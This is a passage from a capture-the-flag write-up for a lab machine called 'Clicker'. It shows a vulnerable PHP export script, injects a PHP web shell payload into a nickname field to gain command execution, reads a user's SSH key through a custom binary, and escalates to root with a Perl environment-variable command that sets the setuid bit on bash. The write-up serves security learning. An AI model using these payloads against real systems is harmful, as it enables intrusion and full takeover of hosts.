</span></span><span class="line"><span class="cl"><span class="nv">$threshold</span> <span class="o">=</span> <span class="mi">1000000</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;threshold&#34;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nx">is_numeric</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;threshold&#34;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$threshold</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;threshold&#34;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="nv">$data</span> <span class="o">=</span> <span class="nx">get_top_players</span><span class="p">(</span><span class="nv">$threshold</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$currentplayer</span> <span class="o">=</span> <span class="nx">get_current_player</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">&#34;PLAYER&#34;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$s</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;extension&#34;</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&#34;txt&#34;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$s</span> <span class="o">.=</span> <span class="s2">&#34;Nickname: &#34;</span><span class="o">.</span> <span class="nv">$currentplayer</span><span class="p">[</span><span class="s2">&#34;nickname&#34;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&#34; Clicks: &#34;</span> <span class="o">.</span> <span class="nv">$currentplayer</span><span class="p">[</span><span class="s2">&#34;clicks&#34;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&#34; Level: &#34;</span> <span class="o">.</span> <span class="nv">$currentplayer</span><span class="p">[</span><span class="s2">&#34;level&#34;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$data</span> <span class="k">as</span> <span class="nv">$player</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$s</span> <span class="o">.=</span> <span class="s2">&#34;Nickname: &#34;</span><span class="o">.</span> <span class="nv">$player</span><span class="p">[</span><span class="s2">&#34;nickname&#34;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&#34; Clicks: &#34;</span> <span class="o">.</span> <span class="nv">$player</span><span class="p">[</span><span class="s2">&#34;clicks&#34;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&#34; Level: &#34;</span> <span class="o">.</span> <span class="nv">$player</span><span class="p">[</span><span class="s2">&#34;level&#34;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;extension&#34;</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&#34;json&#34;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nv">$s</span> <span class="o">.=</span> <span class="nx">json_encode</span><span class="p">(</span><span class="nv">$currentplayer</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nv">$s</span> <span class="o">.=</span> <span class="nx">json_encode</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nv">$s</span> <span class="o">.=</span> <span class="s1">&#39;&lt;table&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="nv">$s</span> <span class="o">.=</span> <span class="s1">&#39;&lt;thead&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="nv">$s</span> <span class="o">.=</span> <span class="s1">&#39;  &lt;tr&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="nv">$s</span> <span class="o">.=</span> <span class="s1">&#39;    &lt;th scope=&#34;col&#34;&gt;Nickname&lt;/th&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="nv">$s</span> <span class="o">.=</span> <span class="s1">&#39;    &lt;th scope=&#34;col&#34;&gt;Clicks&lt;/th&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="nv">$s</span> <span class="o">.=</span> <span class="s1">&#39;    &lt;th scope=&#34;col&#34;&gt;Level&lt;/th&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="nv">$s</span> <span class="o">.=</span> <span class="s1">&#39;  &lt;/tr&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="nv">$s</span> <span class="o">.=</span> <span class="s1">&#39;&lt;/thead&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="nv">$s</span> <span class="o">.=</span> <span class="s1">&#39;&lt;tbody&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="nv">$s</span> <span class="o">.=</span> <span class="s1">&#39;  &lt;tr&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="nv">$s</span> <span class="o">.=</span> <span class="s1">&#39;    &lt;th scope=&#34;row&#34;&gt;&#39;</span> <span class="o">.</span> <span class="nv">$currentplayer</span><span class="p">[</span><span class="s2">&#34;nickname&#34;</span><span class="p">]</span> <span class="o">.</span> <span class="s1">&#39;&lt;/th&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="nv">$s</span> <span class="o">.=</span> <span class="s1">&#39;    &lt;td&gt;&#39;</span> <span class="o">.</span> <span class="nv">$currentplayer</span><span class="p">[</span><span class="s2">&#34;clicks&#34;</span><span class="p">]</span> <span class="o">.</span> <span class="s1">&#39;&lt;/td&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="nv">$s</span> <span class="o">.=</span> <span class="s1">&#39;    &lt;td&gt;&#39;</span> <span class="o">.</span> <span class="nv">$currentplayer</span><span class="p">[</span><span class="s2">&#34;level&#34;</span><span class="p">]</span> <span class="o">.</span> <span class="s1">&#39;&lt;/td&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="nv">$s</span> <span class="o">.=</span> <span class="s1">&#39;  &lt;/tr&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="k">foreach</span> <span class="p">(</span><span class="nv">$data</span> <span class="k">as</span> <span class="nv">$player</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$s</span> <span class="o">.=</span> <span class="s1">&#39;  &lt;tr&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$s</span> <span class="o">.=</span> <span class="s1">&#39;    &lt;th scope=&#34;row&#34;&gt;&#39;</span> <span class="o">.</span> <span class="nv">$player</span><span class="p">[</span><span class="s2">&#34;nickname&#34;</span><span class="p">]</span> <span class="o">.</span> <span class="s1">&#39;&lt;/th&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$s</span> <span class="o">.=</span> <span class="s1">&#39;    &lt;td&gt;&#39;</span> <span class="o">.</span> <span class="nv">$player</span><span class="p">[</span><span class="s2">&#34;clicks&#34;</span><span class="p">]</span> <span class="o">.</span> <span class="s1">&#39;&lt;/td&gt;&#39;</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl">    <span class="nv">$s</span> <span class="o">.=</span> <span class="s1">&#39;    &lt;td&gt;&#39;</span> <span class="o">.</span> <span class="nv">$player</span><span class="p">[</span><span class="s2">&#34;level&#34;</span><span class="p">]</span> <span class="o">.</span> <span class="s1">&#39;&lt;/td&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$s</span> <span class="o">.=</span> <span class="s1">&#39;  &lt;/tr&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="nv">$s</span> <span class="o">.=</span> <span class="s1">&#39;&lt;/tbody&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="nv">$s</span> <span class="o">.=</span> <span class="s1">&#39;&lt;/table&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span> 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$filename</span> <span class="o">=</span> <span class="s2">&#34;exports/top_players_&#34;</span> <span class="o">.</span> <span class="nx">random_string</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&#34;.&#34;</span> <span class="o">.</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;extension&#34;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="nx">file_put_contents</span><span class="p">(</span><span class="nv">$filename</span><span class="p">,</span> <span class="nv">$s</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">header</span><span class="p">(</span><span class="s1">&#39;Location: /admin.php?msg=Data has been saved in &#39;</span> <span class="o">.</span> <span class="nv">$filename</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>We can see that it takes the &rsquo;nickname&rsquo; parameter when executing the code. Lets try and instert this snippet of php to get RCE into the nickname parameter</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> <span class="nx">system</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">]);</span><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p><img src="18.png" alt="image"></p>
<p>Now we export it as php. When accessing the export with the parameter cmd=id, we can see that the command was executed successfully.</p>
<p><img src="21.png" alt="image"></p>
<p>Now we try to establish a reverse shell:</p>
<p><img src="23.png" alt="image"></p>
<p>And we get the reverse shell.</p>
<p><img src="24.png" alt="image"></p>
<h2 id="execution--persistence">
  Execution &amp; Persistence
  <a class="heading-link" href="#execution--persistence">
    <i class="fa fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h2>
<p>Doing some enum, we find the following files in /opt/manage:</p>
<p><img src="25.png" alt="image"></p>
<p>File README.txt contains the usage of the bin execute_query. But maybe there are more options than just 4:</p>
<p><img src="26.png" alt="image"></p>
<p>If we try ./execute_query 5</p>
<p><img src="27.png" alt="image"></p>
<p>Maybe its expecting some arguments. Lets try some things:</p>
<p><img src="28.png" alt="image"></p>
<p>Trying more things, it looks like this binary can read files, so lets read the SSH key.</p>
<p><img src="29.png" alt="image"></p>
<p>Checking /home/users, we can see this can be only jack&rsquo;s private ssh key. Formatting it correctly (correct heather and footer, and new line at the end), we can ssh to user jack and get the user flag.</p>
<p><img src="30.png" alt="image"></p>
<h2 id="privilege-escalation">
  Privilege escalation
  <a class="heading-link" href="#privilege-escalation">
    <i class="fa fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h2>
<p>Now lets look for privilege escalation methods. Lest start with sudo -l:</p>
<p><img src="31.png" alt="image"></p>
<p>We can run the script /opt/monitor.sh as root. Checking the script:</p>
<p><img src="32.png" alt="image"></p>
<p>It uses /bin/bash and /bin/xml_pp. Lets see what is /bin/xml_pp</p>
<p><img src="33.png" alt="image"></p>
<p>It is a perl binary that may be vulnerable to <a href="https://www.exploit-db.com/exploits/39702"  class="external-link" target="_blank" rel="noopener">perl_startup Local Privilege Escalation</a>. We have to run:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">sudo <span class="nv">PERL5OPT</span><span class="o">=</span>-d <span class="nv">PERL5DB</span><span class="o">=</span><span class="s1">&#39;exec &#34;chmod u+s /bin/bash&#34;&#39;</span> /opt/monitor.sh
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">bash -p
</span></span></code></pre></div><p>And rooted!</p>
<p><img src="34.png" alt="image"></p>
<h2 id="conclusion">
  Conclusion
  <a class="heading-link" href="#conclusion">
    <i class="fa fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h2>
<p>The clicker machine is a good learning experience, demonstrating techniques like SQL and CRLF Injections, parameter pampering and perl privilege escalation.</p>
<p>Initial access was gained via chaining SQL injections, parameter tampering and CRLF injection. This made possible to gain a foothold on the machine.</p>
<p>The pivotal pivoting was accomplished via the exploitation of a vulnerable perl binary.</p>
<p>This box exemplifies the importance of thinking broadly across multiple domains like web apps, databases, scripts, authentication, and system administration, to make sure that all layers in the system are properly secured.</p>

      </div>


      <footer>
        


        
        
        
        
        
      </footer>
    </article>

    
  </section>

    </div>

    <footer class="footer">
  <section class="container">
    ©
    
      2023 -
    
    2024
     Dennis Drebitca 
    ·
    
    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/" target="_blank" rel="noopener">Coder</a>.
    
  </section>
</footer>

  </main>

  

  
  
  <script src="/js/coder.min.6ae284be93d2d19dad1f02b0039508d9aab3180a12a06dcc71b0b0ef7825a317.js" integrity="sha256-auKEvpPS0Z2tHwKwA5UI2aqzGAoSoG3McbCw73gloxc="></script>
  

  

  


  

  

  

  

  

  

  

  

  

  

  

  

  

  

  
</body>

</html>
